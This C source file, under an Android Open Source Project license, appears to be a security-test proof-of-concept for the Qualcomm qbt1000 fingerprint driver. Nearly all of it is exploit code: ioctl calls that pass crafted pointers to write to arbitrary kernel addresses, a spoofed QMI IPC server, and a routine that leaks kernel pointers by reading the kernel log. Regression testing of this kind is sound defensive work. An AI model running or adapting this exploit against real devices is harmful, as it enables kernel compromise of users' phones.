/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/klog.h>

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/types.h> /* See NOTES */

static const char *dev = "/dev/qbt1000";

#define QBT1000_SNS_SERVICE_ID 0x138 /* From sns_common_v01.idl */
#define QBT1000_SNS_SERVICE_VER_ID 1
#define QBT1000_SNS_INSTANCE_INST_ID 0

#define SNS_QFP_OPEN_RESP_V01 0x0020

#define QMI_REQUEST_CONTROL_FLAG 0x00
#define QMI_RESPONSE_CONTROL_FLAG 0x02
#define QMI_INDICATION_CONTROL_FLAG 0x04
#define QMI_HEADER_SIZE 7

#define OPTIONAL_TLV_TYPE_START 0x10

enum elem_type {
  QMI_OPT_FLAG = 1,
  QMI_DATA_LEN,
  QMI_UNSIGNED_1_BYTE,
  QMI_UNSIGNED_2_BYTE,
  QMI_UNSIGNED_4_BYTE,
  QMI_UNSIGNED_8_BYTE,
  QMI_SIGNED_2_BYTE_ENUM,
  QMI_SIGNED_4_BYTE_ENUM,
  QMI_STRUCT,
  QMI_STRING,
  QMI_EOTI,
};

volatile int cont = 1;

struct qmi_header {
  unsigned char cntl_flag;
  uint16_t txn_id;
  uint16_t msg_id;
  uint16_t msg_len;
} __attribute__((__packed__));

struct qseecom_handle {
  void *dev;           /* in/out */
  unsigned char *sbuf; /* in/out */
  uint32_t sbuf_len;   /* in/out */
};

enum qbt1000_commands {
  QBT1000_LOAD_APP = 100,
  QBT1000_UNLOAD_APP = 101,
  QBT1000_SEND_TZCMD = 102
};

struct qbt1000_app {
  struct qseecom_handle **app_handle;
  char name[32];
  uint32_t size;
  uint8_t high_band_width;
};

struct qbt1000_send_tz_cmd {
  struct qseecom_handle *app_handle;
  uint8_t *req_buf;
  uint32_t req_buf_len;
  uint8_t *rsp_buf;
  uint32_t rsp_buf_len;
};

struct msm_ipc_port_addr {
  uint32_t node_id;
  uint32_t port_id;
};

struct msm_ipc_port_name {
  uint32_t service;
  uint32_t instance;
};

struct msm_ipc_addr {
  unsigned char addrtype;
  union {
    struct msm_ipc_port_addr port_addr;
    struct msm_ipc_port_name port_name;
  } addr;
};

/*
 * Socket API
 */

#define AF_MSM_IPC 27

#define PF_MSM_IPCAF_MSM_IPC

#define MSM_IPC_ADDR_NAME 1
#define MSM_IPC_ADDR_ID 2

struct sockaddr_msm_ipc {
  unsigned short family;
  struct msm_ipc_addr address;
  unsigned char reserved;
};

struct qbt1000_app app = {0};

static int get_fd(const char *dev_node) {
  int fd;
  fd = open(dev_node, O_RDWR);
  if (fd < 0) {
    cont = 0;
    exit(EXIT_FAILURE);
  }

  return fd;
}

static void leak_heap_ptr(int fd) {
  void *addr = NULL;
  app.app_handle = (void *)&addr;
  app.size = 32;
  ioctl(fd, QBT1000_LOAD_APP, &app);
}

static void arb_kernel_write_load_app(int fd) {
  struct qbt1000_app app = {0};

  app.app_handle = (void *)0xABADACCE55013337;
  ioctl(fd, QBT1000_LOAD_APP, &app);
}

static void arb_kernel_write_send_tzcmd(int fd) {
  struct qseecom_handle hdl = {0};
  struct qbt1000_send_tz_cmd cmd = {0};
  int x = 0;

  hdl.sbuf =
      (void
           *)0xffffffc0017b1b84;  // malloc(4096);//(void *) 0xABADACCE55000000;
  cmd.app_handle = &hdl;
  cmd.req_buf = &x;
  cmd.rsp_buf = NULL;  // malloc(4096);
  cmd.req_buf_len = cmd.rsp_buf_len = 4;

  ioctl(fd, QBT1000_SEND_TZCMD, &cmd);
}

static void recv_msgs(int fd) {
  struct msghdr msg = {0};
  struct iovec io = {0};
  struct sockaddr_msm_ipc addr = {0};
  struct msm_ipc_addr address = {0};
  uint8_t *ptr;
  struct qmi_header *hdr;
  int count = 1;

  io.iov_base = malloc(4096);
  memset(io.iov_base, 0, 4096);
  io.iov_len = 4096;

  msg.msg_iovlen = 1;
  msg.msg_iov = &io;
  msg.msg_name = &addr;
  msg.msg_namelen = sizeof(addr);

  for (int i = 0; i < 1000; i++) {
    recvmsg(fd, &msg, MSG_CMSG_CLOEXEC);
    memset(io.iov_base, 0, 128);
    hdr = io.iov_base;

    hdr->cntl_flag = QMI_RESPONSE_CONTROL_FLAG;
    hdr->txn_id = count++;
    hdr->msg_id = SNS_QFP_OPEN_RESP_V01;
    hdr->msg_len = 3;

    ptr = io.iov_base + sizeof(*hdr);

    *ptr = OPTIONAL_TLV_TYPE_START;
    ptr++;
    *ptr = 0;
    ptr++;
    *ptr = 0;
    sendmsg(fd, &msg, MSG_CMSG_CLOEXEC);
  }
}

#define BUILD_INSTANCE_ID(vers, ins) (((vers)&0xFF) | (((ins)&0xFF) << 8))
static void setup_ipc_server(void) {
  int fd;
  struct sockaddr_msm_ipc addr = {0};
  fd = socket(AF_MSM_IPC, SOCK_DGRAM, 0);

  if (fd < 0) {
    exit(EXIT_FAILURE);
  }

  addr.family = AF_MSM_IPC;
  addr.address.addrtype = MSM_IPC_ADDR_NAME;
  addr.address.addr.port_name.service = QBT1000_SNS_SERVICE_ID;
  addr.address.addr.port_name.instance = BUILD_INSTANCE_ID(
      QBT1000_SNS_SERVICE_VER_ID, QBT1000_SNS_INSTANCE_INST_ID);

  bind(fd, (struct sockaddr *)&addr, sizeof(addr));
  recv_msgs(fd);
  return;
}

static void *leak_ptr(void *ignore) {
  void *save;
  for (int i = 0; i < 1000; i++) {
    if (app.app_handle != NULL) {
      save = *app.app_handle;
      if (save != NULL) {
        break;
      }
    }
  }
  return 0;
}

static void *do_ipc_crap(void *ignore) { setup_ipc_server(); return 0; }

int main2() {
  int i;
  int fd = open("/dev/qbt1000", O_RDWR);
  if (fd < 0) {
    return 1;
  }

  struct qbt1000_app app;

  unsigned char *line = malloc(4096);
  memset(line, 0, 4096);

try_again:
  system("dmesg -c");

  memset(&app, 0x41, sizeof(app));

  app.app_handle = malloc(64);
  if (!app.app_handle) {
    close(fd);
    return 1;
  }

  ioctl(fd, QBT1000_LOAD_APP, &app);

  free(app.app_handle);
  unsigned offset;
  unsigned bytes_leaked;
  unsigned char leaked_bytes[256];
  unsigned idle;
  pid_t child;

  memset(line, 0, 4096);
  offset = 0;
  bytes_leaked = 0;
  idle = 0;
  memset(leaked_bytes, 0, sizeof(leaked_bytes));
  while (!strchr(line, '\n')) {
    if (klogctl(9, NULL, 0))
      offset += klogctl(2, &line[offset], 4096);
    else
      idle++;
    if (idle > 1000) return 0;
  }

  char *inv = strstr(line, "qbt1000_ioctl:");
  if (!inv) return 0;
  inv = strstr(inv, "App ");
  if (!inv) return 0;
  inv += 4;  // go past "App"
  char *a;
  a = strchr(inv, 'A');
  if (!a) return 0;

  // keep going until no more A's
  while (*a++ == 'A')
    ;

  int keep_going = 1;
  while (*a != '\n' && *a != '\0') {
    leaked_bytes[bytes_leaked++] = *a++;
  }

  if (bytes_leaked < 7) {
    goto fork_it;
  }

#define KERN_ADDR 0xffffffc000000000
  // let's do some post-processing to see if we got some pointers
  for (i = 0; i < bytes_leaked - (sizeof(size_t) - 1); i++) {
    size_t *c = (size_t *)(&leaked_bytes[i]);
    if ((*c & KERN_ADDR) == KERN_ADDR) {
      printf("KERNEL ADDRESS LEAKED = 0x%016lx\n", *c);
      keep_going = 0;
    }
  }

  bytes_leaked = 0;
  memset(leaked_bytes, 0, sizeof(leaked_bytes));

  if (keep_going) {
  fork_it:
    usleep(10000);
    child = fork();
    if (child == 0) {
      return 0;
    } else {
      while (child = waitpid(-1, NULL, 0)) {
        if (errno == ECHILD) break;
      }
    }
  }

  close(fd);
  free(line);
  return 0;
}

int main(void) {
  pthread_t ipc;
  pthread_create(&ipc, NULL, do_ipc_crap, NULL);

  usleep(50000);

  main2();
}
